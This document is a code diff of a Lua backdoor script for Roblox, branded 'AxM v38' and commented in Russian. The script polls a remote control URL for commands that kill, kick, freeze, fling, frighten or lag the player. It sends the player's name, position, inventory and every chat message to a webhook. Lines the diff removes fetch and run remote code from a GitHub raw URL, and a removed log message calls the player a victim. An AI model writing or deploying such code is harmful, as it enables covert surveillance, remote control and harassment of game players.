@@ -9,18 +9,17 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
-local MarketplaceService = game:GetService("MarketplaceService")
 local lp = Players.LocalPlayer
 
--- Функция для получения инвентаря
 local function getInventory()
     local tools = {}
-    for _, v in pairs(lp.Backpack:GetChildren()) do table.insert(tools, v.Name) end
-    for _, v in pairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end end
+    pcall(function()
+        for _, v in pairs(lp.Backpack:GetChildren()) do table.insert(tools, v.Name) end
+        for _, v in pairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end end
+    end)
     return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
--- Мощная функция логов
 local function sendLog(title, desc, color)
     pcall(function()
         local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
@@ -32,102 +31,91 @@ local function sendLog(title, desc, color)
                 ["description"] = desc,
                 ["color"] = color or 0xFF0000,
                 ["fields"] = {
-                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
-                    {["name"] = "🎮 Игра", ["value"] = "[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
-                    {["name"] = "🆔 JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. "`", ["inline"] = true},
+                    {["name"] = "🎮 Игра", ["value"] = "ID: " .. game.PlaceId, ["inline"] = true},
                     {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
                     {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "AxM v38 Premium • " .. os.date("%X")}
+                ["footer"] = {["text"] = "AxM v38 • " .. os.date("%X")}
             }}
         }
         local req = (syn and syn.request) or (http and http.request) or http_request or request
-        req({
-            Url = settings.webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+        if req then
+            req({
+                Url = settings.webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
     end)
 end
 
--- Логика управления
 task.spawn(function()
     local last_cmd = ""
     local flingConnection
     
-    -- Инициализация (игнорируем старую команду)
     local _, res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. tick()) end)
     if res then last_cmd = res:gsub("%s+", ""):lower() end
 
     while true do
         task.wait(settings.check_delay)
-        
-        local ok, res = pcall(function() 
-            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
-        end)
+        local ok, res = pcall(function() return game:HttpGet(settings.control .. "?nocache=" .. tick()) end)
 
         if ok and res then
-            local clean_res = res:match("^%s*(.-)%s*$") -- Полная очистка
+            local clean_res = res:match("^%s*(.-)%s*$") or ""
             local current_cmd = clean_res:lower()
 
             if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                 last_cmd = current_cmd
-                
                 local char = lp.Character or lp.CharacterAdded:Wait()
                 local hrp = char:WaitForChild("HumanoidRootPart", 5)
                 local hum = char:FindFirstChildOfClass("Humanoid")
 
                 if hrp and hum then
-                    -- [ ИСПОЛНЕНИЕ КОМАНД ] --
                     if current_cmd == "kill" then
                         hum.Health = 0
-                        sendLog("💀 КОМАНДА: УБИЙСТВО", "Игрок был ликвидирован через панель.")
-
-                    elseif current_cmd:find("gui") then
-                        sendLog("🖥️ КОМАНДА: ЗАПУСК GUI", "Дистанционный запуск AxA Gui...")
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/arxitectorcz/Arxetector/refs/heads/main/AxA%20Gui"))()
-
+                        sendLog("💀 КОМАНДА: УБИЙСТВО", "Исполнено")
                     elseif current_cmd:find("message") then
-                        local msg = clean_res:match("%((.-)%)") or "System Message"
+                        local msg = clean_res:match("%((.-)%)") or "Alert"
                         local g = Instance.new("ScreenGui", lp.PlayerGui)
                         local t = Instance.new("TextLabel", g)
                         t.Size = UDim2.new(1,0,0.2,0); t.Position = UDim2.new(0,0,0.4,0); t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0); t.TextColor3 = Color3.new(1,1,1)
-                        task.delay(5, function() g:Destroy() end)
-                        sendLog("📢 КОМАНДА: СООБЩЕНИЕ", "Текст: " .. msg, 0x00FF00)
-
+                        task.delay(7, function() g:Destroy() end)
+                        sendLog("📢 КОМАНДА: MSG", "Текст: " .. msg)
                     elseif current_cmd == "screamer" then
                         local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
                         local g = Instance.new("ScreenGui", lp.PlayerGui)
                         local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                         task.delay(3, function() g:Destroy() end)
-                        sendLog("😱 КОМАНДА: СКРИМЕР", "Игрок получил инфаркт.")
-
+                        sendLog("😱 КОМАНДА: СКРИМЕР", "Активирован")
                     elseif current_cmd:find("kick") then
-                        local r = clean_res:match("%((.-)%)") or "Connection Error"
-                        sendLog("🚪 КОМАНДА: КИК", "Причина: " .. r, 0xFFFF00)
-                        task.wait(0.5)
+                        local r = clean_res:match("%((.-)%)") or "Error"
+                        sendLog("🚪 КОМАНДА: КИК", "Причина: " .. r)
+                        task.wait(0.3)
                         lp:Kick(r)
-
                     elseif current_cmd == "fling" then
                         if flingConnection then flingConnection:Disconnect() end
                         flingConnection = RunService.Heartbeat:Connect(function()
                             hrp.Velocity = Vector3.new(0, 9999, 0)
                             hrp.RotVelocity = Vector3.new(0, 9999, 0)
                         end)
-                        sendLog("🌪️ КОМАНДА: ФЛИНГ", "Активирован режим полета.")
-
+                        sendLog("🌪️ КОМАНДА: ФЛИНГ", "Включен")
                     elseif current_cmd == "unfling" then
                         if flingConnection then flingConnection:Disconnect() end
-                        sendLog("🛡️ КОМАНДА: УНФЛИНГ", "Флинг отключен.")
-
+                        sendLog("🛡️ КОМАНДА: УНФЛИНГ", "Выключен")
                     elseif current_cmd == "freeze" then
                         hrp.Anchored = true
-                        sendLog("🧊 КОМАНДА: ФРИЗ", "Игрок застыл.")
-
+                        sendLog("🧊 КОМАНДА: ФРИЗ", "Заморожен")
                     elseif current_cmd == "unfreeze" then
                         hrp.Anchored = false
-                        sendLog("🔥 КОМАНДА: УНФРИЗ", "Игрок разморожен.")
+                        sendLog("🔥 КОМАНДА: УНФРИЗ", "Разморожен")
+                    elseif current_cmd == "horror" then
+                        Lighting.ClockTime = 0; Lighting.Brightness = 0
+                        sendLog("🌑 КОМАНДА: ХОРРОР", "Тьма")
+                    elseif current_cmd == "lag" then
+                        for i=1,1000 do Instance.new("Part", workspace).Position = hrp.Position end
+                        sendLog("🐌 КОМАНДА: ЛАГ", "Запамлено")
                     end
                 end
             end
@@ -135,15 +123,10 @@ task.spawn(function()
     end
 end)
 
--- Логи чата
-lp.Chatted:Connect(function(m) 
-    sendLog("💬 ЧАТ", "Сообщение: " .. m, 0x3498DB) 
-end)
+lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", "Сообщение: " .. m, 0x3498DB) end)
 
--- Лог при выходе
 game:BindToClose(function()
-    sendLog("🔴 ИГРОК ВЫШЕЛ", "Жертва покинула сервер или закрыла игру.", 0x333333)
+    sendLog("🔴 ВЫХОД", "Игрок покинул сервер", 0x333333)
 end)
 
--- Стартовый лог
-sendLog("🛰️ AxM v38 АКТИВИРОВАН", "Скрипт успешно запущен. Ожидаю команд с Pastebin...", 0x00FF00)
+sendLog("🛰️ AxM v38 ONLINE", "Ожидание команд...", 0x00FF00)
